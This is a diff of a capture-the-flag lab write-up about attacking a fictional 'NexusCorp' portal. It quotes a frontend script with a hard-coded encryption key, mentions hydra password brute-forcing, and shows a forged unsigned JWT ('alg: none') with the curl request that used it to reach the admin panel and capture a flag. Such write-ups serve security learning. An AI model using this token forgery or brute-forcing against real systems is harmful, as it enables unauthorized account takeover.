@@ -74,6 +74,47 @@ NexusCorp Backup Configuration
 config.enc  - Encrypted application configuration (AES-128-ECB)
 Decryption key reference: see static/app.js (deployment notes)
 
+The only self explainatory thing to do from here was to view that file and see what was located there:
+// NexusCorp Portal - Frontend Utilities
+// v2.3.1 - Build 20241115
+
+(function() {
+    'use strict';
+
+    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
+    const CONFIG = {
+        apiBase: '/api',
+        // Encryption key for backup config decryption - AES-ECB-128
+        // Key: N3xusK3y2024!!  (pad to 16 bytes with �)
+        _backupKey: 'N3xusK3y2024!!',
+        appVersion: '2.3.1'
+    };
+
+    // Session helper
+    window.NexusApp = {
+        getSession: function() {
+            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('nexus_session='));
+            if (!cookie) return null;
+            try {
+                return JSON.parse(atob(cookie.split('=')[1].trim()));
+            } catch(e) { return null; }
+        },
+        getApiToken: function() {
+            return localStorage.getItem('nexus_jwt');
+        },
+        setApiToken: function(token) {
+            localStorage.setItem('nexus_jwt', token);
+        }
+    };
+
+    // Auto-fetch JWT if not cached
+    if (!localStorage.getItem('nexus_jwt') && document.cookie.includes('nexus_session')) {
+        fetch('/api/auth/token.php', {credentials: 'include'})
+            .then(r => r.json())
+            .then(d => { if (d.token) localStorage.setItem('nexus_jwt', d.token); })
+            .catch(() => {});
+    }
+})();
 
 
 Now that I have a list of usernames I am going to brute force the webspage using hydra and a wordlist saved to the attack box 
@@ -123,10 +164,73 @@ One flag down!
 
 Now that I am logged into Sarah I copy her session cookie 
 eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InNhcmFoLmpvaG5zb24iLCJyb2xlIjoidXNlciJ9.0bceab2ebd4da65aefd97d6b1c7a2f3a8fa71d6ee3882cc44b8d97937a5fc49d
-It looks like the cookie is sectioned off into two different parts seperated by a . 
-After throwing the cookie into Cyberchef I was able to decode the first part 
-eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6InNhcmFoLmpvaG5zb24iLCJyb2xlIjoidXNlciJ9 = {"user_id":3,"username":"sarah.johnson","role":"user"}
-This had me thinking what if I change the information to the known admin info which would be 
-eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWlufQ== = {"user_id":1,"username":"laura.hayes","role":"admin}
-This would make our new value eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWlufQ==.0bceab2ebd4da65aefd97d6b1c7a2f3a8fa71d6ee3882cc44b8d97937a5fc49d
-After trying this as the new cookie I was brougt back to the login page which means the second value as plays a role into how this user is logged in 
+From my earlier discovery this is a JWT token. 
+I can bring this to jwt.io and decode it there which gives me 
+
+{
+  "user_id": 3,
+  "username": "sarah.johnson",
+  "role": "user"
+}
+
+All I need to do now is switch the values to the admin values and decode it. 
+Using jwt.io I create this JWT Token 
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0.
+
+Now with this token I can do a curl request to the admin page I found earlier in discovery 
+curl -i -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0.' http://10.128.148.14/admin/
+
+This results to 
+
+HTTP/1.1 200 OK
+Date: Thu, 05 Nov 2026 19:10:49 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Authorization,Accept-Encoding
+Content-Length: 1304
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Admin Panel - NexusCorp</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<nav class="navbar">
+  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp Admin</div>
+  <div class="nav-links">
+    <a href="/dashboard.php">Portal</a>
+    <a href="/logout.php">Logout</a>
+  </div>
+</nav>
+<div class="container">
+  <div class="admin-header">
+    <h1>Administration Console</h1>
+    <p>Logged in as: <strong></strong></p>
+  </div>
+  <div class="flag-box">
+    <h3>System Status</h3>
+    <p>Internal reference: <code>THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</code></p>
+  </div>
+  <div class="card-grid">
+    <div class="card">
+      <h3>User Management</h3>
+      <p>Manage employee accounts and permissions.</p>
+      <a href="/api/users/profile.php?id=1" class="btn-secondary">View User API</a>
+    </div>
+    <div class="card">
+      <h3>File System Access</h3>
+      <p>Internal document viewer via authenticated API.</p>
+      <p><small>GET /api/files.php?name=[path] with Bearer token</small></p>
+    </div>
+    <div class="card">
+      <h3>Support Queue</h3>
+      <p>Pending tickets requiring admin review.</p>
+      <p><strong>0</strong> unread tickets</p>    </div>
+  </div>
+</div>
+</body>
+</html>
+Second flag found!
+
